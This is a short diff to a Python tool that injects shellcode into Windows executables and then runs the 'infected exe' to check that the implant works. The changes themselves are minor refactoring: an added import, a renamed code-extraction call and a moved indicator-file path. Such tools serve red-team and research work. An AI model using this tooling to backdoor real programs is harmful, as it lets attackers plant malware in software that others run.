@@ -2,6 +2,7 @@ from helper import *
 import shutil
 import pprint
 import logging
+import time
 
 from pehelper import *
 from model import *
@@ -36,7 +37,7 @@ def inject_exe(shc_file: FilePath):
     # and re-implant it
     if project.source_style == SourceStyle.iat_reuse:
         # get code section of exe_out
-        code = get_code_section_data(exe_out)
+        code = extract_code_from_exe(exe_out)
         for cap in exe_capabilities.get_all().values():
             if not cap.id in code:
                 logger.error("Capability ID {} not found, abort".format(cap.id))
@@ -58,16 +59,16 @@ def inject_exe(shc_file: FilePath):
 def verify_injected_exe(exefile):
     logger.info("---[ Verify infected exe: {} ".format(exefile))
     # remove indicator file
-    pathlib.Path(verify_filename).unlink(missing_ok=True)
+    pathlib.Path(project.verify_filename).unlink(missing_ok=True)
 
     run_process_checkret([
         exefile,
     ], check=False)
     time.sleep(SHC_VERIFY_SLEEP)
-    if os.path.isfile(verify_filename):
+    if os.path.isfile(project.verify_filename):
         logger.info("---> Verify OK. Infected exe works (file was created)")
         # better to remove it immediately
-        os.remove(verify_filename)
+        os.remove(project.verify_filename)
         return True
     else:
         logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
